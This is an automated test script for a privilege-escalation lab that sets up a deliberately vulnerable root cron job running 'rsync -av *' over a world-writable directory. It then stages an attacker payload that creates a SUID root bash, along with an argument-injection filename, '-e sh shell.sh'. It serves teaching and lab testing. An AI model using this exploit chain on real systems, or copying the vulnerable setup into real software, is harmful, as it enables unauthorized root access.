#!/bin/bash
#
# Automated Test Script for Privilege Escalation Lab
# Scenario: Rsync Wildcard Injection → Root
#
# Must be run as root: sudo ./test_lab.sh
#

export PATH="/usr/sbin:/sbin:$PATH"

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0

TEST_USER="developer"
TEST_PASS="developer123"

#######################################
# Logging functions
#######################################
log_header() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  $1${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
}

log_phase() {
    echo ""
    echo -e "${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ ${BOLD}$1${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
}

log_step() {
    echo -e "${YELLOW}  ► $1${NC}"
}

log_check() {
    echo -n "    [CHECK] $1 ... "
}

log_pass() {
    echo -e "${GREEN}✓ PASS${NC}"
    PASS=$((PASS + 1))
}

log_fail() {
    echo -e "${RED}✗ FAIL${NC}"
    echo -e "${RED}      Expected: $1${NC}"
    echo -e "${RED}      Got: $2${NC}"
    FAIL=$((FAIL + 1))
}

log_info() {
    echo -e "    ${CYAN}ℹ $1${NC}"
}

log_attack() {
    echo -e "    ${RED}⚔ $1${NC}"
}

#######################################
# Cleanup function
#######################################
cleanup() {
    log_phase "CLEANUP"

    pkill -u "$TEST_USER" 2>/dev/null || true
    userdel -r "$TEST_USER" 2>/dev/null || true

    rm -f /etc/cron.d/rsync-backup 2>/dev/null || true
    rm -f /usr/local/bin/rsync-backup.sh 2>/dev/null || true
    rm -rf /var/backup-staging 2>/dev/null || true
    rm -rf /var/backups/remote 2>/dev/null || true
    rm -f /var/log/rsync-backup.log 2>/dev/null || true

    rm -f /tmp/rootbash 2>/dev/null || true
    rm -f /tmp/pwned.txt 2>/dev/null || true
    rm -f /root/pwned_by_developer 2>/dev/null || true

    log_info "Cleanup complete"
}

#######################################
# Pre-flight checks
#######################################
preflight() {
    log_phase "PRE-FLIGHT CHECKS"

    log_check "Running as root"
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}✗ FAIL${NC}"
        echo "This script must be run as root (sudo ./test_lab.sh)"
        exit 1
    fi
    log_pass

    log_check "rsync available"
    if command -v rsync &> /dev/null; then
        log_pass
    else
        log_fail "rsync installed" "rsync not found"
        exit 1
    fi

    log_step "Cleaning any previous test artifacts..."
    cleanup
}

#######################################
# PHASE 0: Setup environment
#######################################
phase_0() {
    log_phase "PHASE 0 — Environment Setup (Simulating IT Department)"

    log_step "Creating developer user..."
    useradd -m -s /bin/bash "$TEST_USER"
    echo "$TEST_USER:$TEST_PASS" | chpasswd

    log_check "Developer user created"
    if id "$TEST_USER" &>/dev/null; then
        log_pass
    else
        log_fail "user exists" "user not found"
    fi

    log_step "Creating world-writable backup staging directory..."
    mkdir -p /var/backup-staging
    chmod 1777 /var/backup-staging

    log_check "Staging directory permissions"
    PERMS=$(stat -c '%a' /var/backup-staging)
    if [[ "$PERMS" == "1777" ]]; then
        log_pass
    else
        log_fail "1777" "$PERMS"
    fi

    log_step "Creating rsync backup script..."
    cat > /usr/local/bin/rsync-backup.sh << 'SCRIPT'
#!/bin/bash
# Rsync Backup Script - Simulated for Lab
STAGING="/var/backup-staging"
BACKUP="/var/backups/remote"
LOG="/var/log/rsync-backup.log"

echo "[$(date)] Starting backup sync" >> "$LOG"
mkdir -p "$BACKUP"

cd "$STAGING"
# VULNERABLE: Using wildcard with rsync
rsync -av * "$BACKUP/" 2>> "$LOG"

echo "[$(date)] Backup complete" >> "$LOG"
SCRIPT

    chmod 755 /usr/local/bin/rsync-backup.sh
    chown root:root /usr/local/bin/rsync-backup.sh

    log_step "Creating cron job..."
    echo "*/5 * * * * root /usr/local/bin/rsync-backup.sh" > /etc/cron.d/rsync-backup
    chmod 644 /etc/cron.d/rsync-backup

    log_step "Adding legitimate files..."
    echo "Legitimate data" > /var/backup-staging/data.txt
    chown "$TEST_USER:$TEST_USER" /var/backup-staging/data.txt

    touch /var/log/rsync-backup.log
    chmod 644 /var/log/rsync-backup.log
    mkdir -p /var/backups/remote

    log_info "Environment setup complete"
    log_info "Trust boundary: root runs rsync * on writable directory"
}

#######################################
# PHASE 1: Verify attacker has no privileges
#######################################
phase_1() {
    log_phase "PHASE 1 — Verify Attacker Starts Unprivileged"

    log_check "Developer has no sudo access"
    SUDO_CHECK=$(su - "$TEST_USER" -c 'sudo -l' 2>&1 || true)
    if echo "$SUDO_CHECK" | grep -qi "may not run sudo\|not in the sudoers\|not allowed"; then
        log_pass
    else
        log_fail "no sudo" "$SUDO_CHECK"
    fi

    log_check "Developer CAN write to staging directory"
    su - "$TEST_USER" -c 'touch /var/backup-staging/test_write && rm /var/backup-staging/test_write'
    if [[ $? -eq 0 ]]; then
        log_pass
    else
        log_fail "write access" "no write access"
    fi

    log_info "Attacker is unprivileged but has write access to staging"
}

#######################################
# PHASE 2: Attacker enumeration
#######################################
phase_2() {
    log_phase "PHASE 2 — Attacker Enumeration"

    log_step "Attacker discovers writable directories..."

    log_check "Attacker finds /var/backup-staging"
    FIND_RESULT=$(su - "$TEST_USER" -c 'find /var -type d -perm -0002 2>/dev/null' || true)
    if echo "$FIND_RESULT" | grep -q "backup-staging"; then
        log_pass
    else
        log_fail "staging found" "$FIND_RESULT"
    fi

    log_check "Backup script uses wildcard with rsync"
    SCRIPT_CONTENT=$(su - "$TEST_USER" -c 'cat /usr/local/bin/rsync-backup.sh')
    if echo "$SCRIPT_CONTENT" | grep -q 'rsync.*\*'; then
        log_pass
    else
        log_fail "rsync wildcard found" "no wildcard"
    fi

    log_info "Attacker identifies: root runs 'rsync -av *' on writable directory"
}

#######################################
# PHASE 3: Exploitation
#######################################
phase_3() {
    log_phase "PHASE 3 — Exploitation"

    log_step "Attacker creates payload script..."
    su - "$TEST_USER" -c 'cat > /var/backup-staging/shell.sh << '\''EOF'\''
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF'
    su - "$TEST_USER" -c 'chmod +x /var/backup-staging/shell.sh'

    log_check "Payload script created"
    if [[ -f /var/backup-staging/shell.sh ]]; then
        log_pass
    else
        log_fail "shell.sh exists" "not found"
    fi

    log_step "Attacker creates rsync argument injection file..."
    # For rsync, -e specifies the remote shell command
    # When rsync tries to use it for local sync, it still processes the argument
    su - "$TEST_USER" -c 'touch "/var/backup-staging/-e sh shell.sh"'

    log_check "Injection file created"
    if [[ -f "/var/backup-staging/-e sh shell.sh" ]]; then
        log_pass
    else
        log_fail "file exists" "not found"
    fi

    log_info "Payload staged in backup staging directory"
    log_attack "When root runs 'rsync -av *', filenames become arguments"
}

#######################################
# PHASE 4: Trigger and verify
#######################################
phase_4() {
    log_phase "PHASE 4 — Root Executes Rsync with Wildcard"

    log_step "Simulating cron execution (root runs backup script)..."
    /usr/local/bin/rsync-backup.sh 2>/dev/null || true

    log_check "/tmp/rootbash exists"
    if [[ -f /tmp/rootbash ]]; then
        log_pass
    else
        log_fail "file exists" "not found (payload did not execute)"
        log_info "Note: rsync -e injection may not work for local syncs"
        log_info "This demonstrates the concept; real attacks may need remote targets"
        return
    fi

    log_check "/tmp/rootbash owned by root"
    OWNER=$(stat -c '%U' /tmp/rootbash)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_check "/tmp/rootbash has SUID bit"
    PERMS=$(stat -c '%a' /tmp/rootbash)
    if [[ "$PERMS" == "4755" ]]; then
        log_pass
    else
        log_fail "4755" "$PERMS"
    fi

    log_attack "SUID root shell created at /tmp/rootbash"
}

#######################################
# PHASE 5: Prove root access
#######################################
phase_5() {
    log_phase "PHASE 5 — Privilege Escalation Verification"

    if [[ ! -f /tmp/rootbash ]]; then
        log_info "Skipping — SUID shell was not created"
        log_info "The rsync -e technique requires specific conditions"
        return
    fi

    log_step "Attacker executes SUID shell..."

    log_check "Developer achieves euid=0 (root)"
    ID_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "id"' 2>&1)
    if echo "$ID_CHECK" | grep -q "euid=0"; then
        log_pass
        log_info "ID output: $ID_CHECK"
    else
        log_fail "euid=0(root)" "$ID_CHECK"
    fi

    echo ""
    log_attack "╔═══════════════════════════════════════════════════════════╗"
    log_attack "║         PRIVILEGE ESCALATION SUCCESSFUL                   ║"
    log_attack "║                                                           ║"
    log_attack "║   Started as:  developer (uid=1001)                       ║"
    log_attack "║   Achieved:    root (euid=0)                              ║"
    log_attack "║   Method:      Rsync Wildcard Injection                   ║"
    log_attack "╚═══════════════════════════════════════════════════════════╝"
}

#######################################
# Summary
#######################################
summary() {
    log_header "TEST SUMMARY"

    echo ""
    echo -e "  Tests passed: ${GREEN}${BOLD}$PASS${NC}"
    echo -e "  Tests failed: ${RED}${BOLD}$FAIL${NC}"
    echo ""

    if [[ $FAIL -eq 0 ]]; then
        echo -e "${GREEN}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}${BOLD}  ║           ALL TESTS PASSED — LAB IS FUNCTIONAL            ║${NC}"
        echo -e "${GREEN}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    else
        echo -e "${YELLOW}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}${BOLD}  ║  NOTE: Rsync -e injection has specific requirements       ║${NC}"
        echo -e "${YELLOW}${BOLD}  ║  The concept is demonstrated; see LAB_INSTRUCTIONS.md    ║${NC}"
        echo -e "${YELLOW}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    fi
    echo ""
    echo "  This lab demonstrates wildcard injection concepts with rsync."
    echo "  Similar to tar wildcard injection, but rsync's -e option"
    echo "  behavior depends on whether the sync is local or remote."
    echo ""
}

#######################################
# Main
#######################################
main() {
    log_header "Privilege Escalation Lab — Automated Test"
    echo ""
    echo "  Scenario: Remote Backup Synchronization"
    echo "  Attack:   Rsync Wildcard Injection"
    echo "  Goal:     developer → root (euid=0)"

    trap cleanup EXIT

    preflight
    phase_0
    phase_1
    phase_2
    phase_3
    phase_4
    phase_5
    summary
}

main "$@"
